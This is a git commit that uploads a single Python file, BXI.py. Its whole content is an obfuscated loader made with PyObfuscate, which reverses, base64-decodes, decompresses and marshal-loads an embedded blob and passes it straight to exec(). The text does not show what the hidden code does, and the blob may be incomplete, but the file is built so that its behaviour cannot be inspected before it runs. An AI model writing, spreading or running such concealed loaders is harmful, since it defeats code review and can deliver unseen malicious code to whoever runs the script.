53a637bb9f155edb98bb5dd1c1a06a0bad50ecc7
COOL-ROOM-368 <147789027+COOL-ROOM-368@users.noreply.github.com>
2023-12-12 07:21:40 +0630

    Add files via upload

---
+++ BXI.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Tue Dec 12 07:18:48 2023
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=4SHHEDAAUlAxWRDAiLkg5tMyMDM+QyCswFQMKWgYrY7SNnSTNvcshzv2VhNM/V+g8shKtOSRcGhTNrFpP5TU/S1X/80Rf9wLiXyrSiE8nMoMThwQiMyFjxyQOMmCDpwQ6MmQCxs6DFTCAkZLxJe'))
